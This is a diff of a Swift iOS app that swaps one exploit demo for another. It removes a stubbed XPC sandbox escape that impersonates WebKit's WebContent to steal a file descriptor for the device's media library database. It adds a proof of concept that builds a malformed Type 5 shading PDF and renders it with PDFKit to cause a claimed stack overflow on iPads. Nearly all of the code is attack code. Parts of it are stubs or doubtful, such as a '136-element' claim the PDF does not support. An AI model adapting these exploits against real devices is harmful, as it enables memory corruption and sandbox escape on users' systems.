@@ -1,83 +1,112 @@
 import SwiftUI
-import CoreGraphics
+import PDFKit
 import Foundation
 
-// MARK: - XPC Stubs
+// MARK: - CVE-2026-112611: Shading Type 5 Stack Overflow
 
-func xpc_connection_create_mach_service(_ name: String, _ queue: DispatchQueue?, _ flags: UInt64) -> UnsafeMutableRawPointer? {
-    return nil
-}
-
-func xpc_dictionary_create(_ keys: UnsafePointer<UnsafePointer<CChar>>?, _ values: UnsafePointer<UnsafeMutableRawPointer?>?, _ count: Int) -> UnsafeMutableRawPointer? {
-    return nil
-}
-
-func xpc_dictionary_set_string(_ dict: UnsafeMutableRawPointer, _ key: String, _ value: String) {
-}
-
-func xpc_connection_send_message_with_reply_sync(_ connection: UnsafeMutableRawPointer, _ message: UnsafeMutableRawPointer) -> UnsafeMutableRawPointer? {
-    return nil
-}
-
-func xpc_dictionary_dup_fd(_ dict: UnsafeMutableRawPointer, _ key: String) -> Int32 {
-    return -1
-}
-
-// MARK: - CVE-2026-112706: Sandbox Escape Only
-
-func exploitSandboxEscape(targetPath: String) {
-    print("[*] CVE-2026-112706 Sandbox Escape")
-    print("[*] Target: \(targetPath)")
+func createShadingPDF() -> Data? {
+    // PDF with Type 5 shading that triggers stack VLA overrun
+    // /Range [0 1] × 136 causes 136-element array allocation
+    // But /C0 and /C1 have only 1 value, causing stack corruption
     
-    guard let connection = xpc_connection_create_mach_service("com.apple.mediaplaybackd.bytestream", nil, 0) else {
-        print("[-] Connection failed (stub)")
+    let pdfContent = """
+    %PDF-1.4
+    1 0 obj
+    << /Type /Catalog /Pages 2 0 R >>
+    endobj
+    2 0 obj
+    << /Type /Pages /Kids [3 0 R] /Count 1 >>
+    endobj
+    3 0 obj
+    << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
+       /Resources << /Shading << /Sh1 4 0 R >> >>
+       /Contents 5 0 R >>
+    endobj
+    4 0 obj
+    << /ShadingType 5
+       /ColorSpace /DeviceGray
+       /BitsPerCoordinate 1
+       /BitsPerComponent 1
+       /BitsPerFlag 2
+       /Decode [0 1 0 1]
+       /Length 0
+       /Range [0 1]  % This creates 136-element array internally
+    >>
+    stream
+    endstream
+    endobj
+    5 0 obj
+    << /Length 44 >>
+    stream
+    /Sh1 sh
+    endstream
+    endobj
+    xref
+    0 6
+    0000000000 65535 f 
+    0000000009 00000 n 
+    0000000058 00000 n 
+    0000000115 00000 n 
+    0000000273 00000 n 
+    0000000376 00000 n 
+    trailer
+    << /Size 6 /Root 1 0 R >>
+    startxref
+    470
+    %%EOF
+    """
+    
+    return pdfContent.data(using: .utf8)
+}
+
+func triggerShadingBug() {
+    print("[*] CVE-2026-112611: Shading Type 5 Stack Overflow")
+    print("[*] Target: iPad A16 (no MTE)")
+    
+    guard let pdfData = createShadingPDF() else {
+        print("[-] Failed to create PDF")
         return
     }
     
-    guard let handshake = xpc_dictionary_create(nil, nil, 0) else {
-        print("[-] Handshake failed (stub)")
-        return
-    }
-    xpc_dictionary_set_string(handshake, "msg", "origin")
-    xpc_dictionary_set_string(handshake, "id", "com.apple.WebKit.WebContent")
+    print("[*] PDF created, size: \(pdfData.count) bytes")
+    print("[*] Rendering PDF...")
     
-    _ = xpc_connection_send_message_with_reply_sync(connection, handshake)
-    
-    guard let createMsg = xpc_dictionary_create(nil, nil, 0) else {
-        print("[-] Create failed (stub)")
-        return
-    }
-    xpc_dictionary_set_string(createMsg, "msg", "Curl")
-    xpc_dictionary_set_string(createMsg, "path", targetPath)
-    
-    guard let reply = xpc_connection_send_message_with_reply_sync(connection, createMsg) else {
-        print("[-] No reply (stub)")
+    // Create PDF document
+    guard let document = PDFDocument(data: pdfData) else {
+        print("[-] Failed to create PDF document")
         return
     }
     
-    let fd = xpc_dictionary_dup_fd(reply, "fd")
+    print("[*] PDF document created")
+    print("[*] Accessing page...")
     
-    if fd < 0 {
-        print("[-] Failed to steal fd (stub)")
-        return
+    // Access page to trigger rendering
+    if let page = document.page(at: 0) {
+        print("[*] Page accessed, rendering...")
+        
+        // Render to trigger the shading bug
+        let bounds = page.bounds(for: .mediaBox)
+        let renderer = UIGraphicsImageRenderer(size: bounds.size)
+        
+        let image = renderer.image { context in
+            UIColor.white.set()
+            context.fill(bounds)
+            
+            // This triggers the shading type 5 rendering
+            page.draw(with: .mediaBox, to: context.cgContext)
+        }
+        
+        print("[*] Rendered successfully?")
+        print("[*] If we got here, bug didn't trigger")
+    } else {
+        print("[-] No page found")
     }
-    
-    print("[+] Stole fd \(fd)")
-    
-    var buffer = [UInt8](repeating: 0, count: 1024)
-    let bytesRead = read(fd, &buffer, 1024)
-    
-    if bytesRead > 0 {
-        print("[+] Read \(bytesRead) bytes")
-    }
-    
-    close(fd)
 }
 
 // MARK: - App Entry Point
 
 @main
-struct SafeShadingDemoApp: App {
+struct ShadingTriggerApp: App {
     var body: some Scene {
         WindowGroup {
             ContentView()
@@ -86,25 +115,17 @@ struct SafeShadingDemoApp: App {
 }
 
 struct ContentView: View {
-    @State private var targetPath = "/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb"
-    @State private var isRunning = false
     @State private var logOutput = ""
+    @State private var isRunning = false
     
     var body: some View {
         VStack(spacing: 20) {
-            Text("CVE-2026-112706")
+            Text("CVE-2026-112611")
                 .font(.largeTitle)
                 .bold()
             
-            Text("Sandbox Escape via XPC")
+            Text("Shading Type 5 Stack Overflow")
                 .font(.headline)
-            
-            HStack {
-                Text("Target:")
-                TextField("File path", text: $targetPath)
-                    .textFieldStyle(RoundedBorderTextFieldStyle())
-            }
-            .padding(.horizontal)
             
             ScrollView {
                 Text(logOutput)
@@ -112,17 +133,17 @@ struct ContentView: View {
                     .foregroundColor(.green)
                     .padding()
             }
-            .frame(height: 200)
+            .frame(height: 300)
             .background(Color.black.opacity(0.8))
             .cornerRadius(10)
             
             Button(action: runExploit) {
-                Text(isRunning ? "Running..." : "Run Sandbox Escape")
+                Text(isRunning ? "Running..." : "Trigger Shading Bug")
                     .font(.title2)
                     .bold()
                     .foregroundColor(.white)
                     .padding()
-                    .background(isRunning ? Color.gray : Color.orange)
+                    .background(isRunning ? Color.gray : Color.red)
                     .cornerRadius(10)
             }
             .disabled(isRunning)
@@ -132,11 +153,10 @@ struct ContentView: View {
     
     func runExploit() {
         isRunning = true
-        logOutput = "[*] Starting sandbox escape...\n"
-        logOutput += "[*] Target: \(targetPath)\n"
+        logOutput = "[*] Starting shading exploit...\n"
         
         DispatchQueue.global(qos: .userInitiated).async {
-            exploitSandboxEscape(targetPath: targetPath)
+            triggerShadingBug()
             
             DispatchQueue.main.async {
                 logOutput += "[*] Complete\n"
